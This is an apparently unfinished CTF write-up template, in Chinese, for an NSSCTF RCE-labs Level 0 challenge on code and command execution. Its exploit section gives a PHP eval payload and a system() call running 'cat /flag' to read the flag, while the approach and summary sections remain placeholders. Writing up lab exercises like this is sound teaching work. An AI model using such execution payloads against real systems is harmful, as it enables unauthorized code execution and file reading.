> Problem: [[RCE-labs]Level 0 -  代码执行&命令执行](https://www.nssctf.cn/problem/6006)

## 思路
* 解题大致思路

## EXP
* 具体攻击代码
代码执行：

eval("include('flag.php');echo 'This will get the flag by eval PHP code: '.\$flag;");
命令执行：

system("echo 'This will get the flag by Linux bash command - cat /flag: ';cat /flag");

## 总结
* 对该题的考点总结
